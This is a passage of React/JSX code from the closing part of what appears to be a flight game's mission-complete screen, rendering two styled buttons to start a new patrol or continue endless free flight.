                className="w-full py-2.5 bg-cyan-600 text-white font-mono font-bold text-xs tracking-widest hover:bg-cyan-500 uppercase rounded transition-all shadow-[0_0_15px_rgba(6,182,212,0.2)]"
              >
                Start New Flight Patrol
              </button>
              
              <button
                onClick={() => {
                  playCorrectAnswerSound(soundConfig);
                  setMissionCompleted(false); // continues current flight in endless free mode
                }}
                className="w-full py-2 bg-transparent hover:bg-slate-900 border border-slate-800 text-cyan-400 hover:text-cyan-300 font-mono text-xs tracking-widest uppercase rounded transition-all"
              >
                Continue Endless Free Flight
              </button>
            </div>
          </div>
        </div>
      )}
    </>
  );
};
